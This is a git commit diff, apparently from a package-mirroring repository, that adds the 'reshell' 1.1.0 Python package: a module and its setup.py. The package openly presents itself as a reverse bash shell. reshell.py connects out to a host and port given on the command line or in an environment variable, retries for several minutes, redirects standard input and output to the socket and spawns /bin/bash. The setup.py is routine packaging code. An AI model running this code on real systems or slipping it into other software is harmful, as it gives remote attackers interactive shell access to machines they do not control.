d3c8ccb1eedef5c96bc86f91d4f2e7d5383b5d09
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-24 15:05:48 +0000

    Add package reshell/1.1.0/reshell-1.1.0.tar.gz

---
+++ packages/reshell/reshell-1.1.0.tar.gz/reshell-1.1.0/reshell.py
@@ -0,0 +1,48 @@
+#!/usr/bin/python
+
+import os
+import sys
+import pty
+import time
+import socket
+from multiprocessing import Process
+
+
+__version__ = '1.1.0'
+
+
+def start_daemon(target):
+    Process(target=run_bash, args=(target,), daemon=True).start()
+
+
+def connect_to_target(target):
+    host, port = target.split(':')
+    port = int(port)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    for minute in range(10):
+        for second in range(0, 60, 10):
+            try:
+                sock.connect((host, port))
+                return sock
+            except socket.error:
+                time.sleep(10)
+
+
+def run_bash(target):
+    sock = connect_to_target(target)
+    if sock:
+        for channel in (0, 1, 2):
+            os.dup2(sock.fileno(), channel)
+        pty.spawn("/bin/bash")
+
+
+def main():
+    if len(sys.argv) == 2:
+        target = sys.argv[1]
+    else:
+        target = os.environ["RESHELL_TARGET"]
+    run_bash(target)
+
+
+if __name__ == '__main__':
+    main()
---
+++ packages/reshell/reshell-1.1.0.tar.gz/reshell-1.1.0/setup.py
@@ -0,0 +1,68 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+
+try:
+    from setuptools import setup
+except ImportError:
+    from distutils.core import setup
+
+version = "1.1.0"
+
+if sys.argv[-1] == 'publish':
+    try:
+        import wheel  # noqa
+    except ImportError:
+        raise ImportError("Fix: pip install wheel")
+    os.system('python setup.py sdist bdist_wheel upload')
+    print("You probably want to also tag the version now:")
+    print("  git tag -a %s -m 'version %s'" % (version, version))
+    print("  git push --tags")
+    sys.exit()
+
+if sys.argv[-1] == 'tag':
+    print("Tagging the version on github:")
+    os.system("git tag -a %s -m 'version %s'" % (version, version))
+    os.system("git push --tags")
+    sys.exit()
+
+readme = open('README.rst').read()
+history = open('HISTORY.rst').read().replace('.. :changelog:', '')
+
+
+setup(
+    name='reshell',
+    version=version,
+    description="""Python reverse bash shell""",
+    long_description=readme + '\n\n' + history,
+    author='Peter Demin',
+    author_email='peterdemin@gmail.com',
+    url='https://github.com/peterdemin/reshell',
+    include_package_data=True,
+    py_modules=['reshell'],
+    install_requires=[],
+    license="BSD",
+    zip_safe=False,
+    keywords='reshell',
+    classifiers=[
+        'Development Status :: 6 - Mature',
+        'Intended Audience :: Developers',
+        'License :: OSI Approved :: BSD License',
+        'Natural Language :: English',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.8',
+        'Programming Language :: Python :: 3.9',
+        'Programming Language :: Python :: 3.10',
+        'Programming Language :: Python :: 3.11',
+        'Programming Language :: Python :: 3.12',
+        'Programming Language :: Python :: 3.13',
+        'Programming Language :: Python :: 3.14',
+    ],
+    entry_points={
+        'console_scripts': [
+            'reshell = reshell:main',
+        ]
+    },
+)
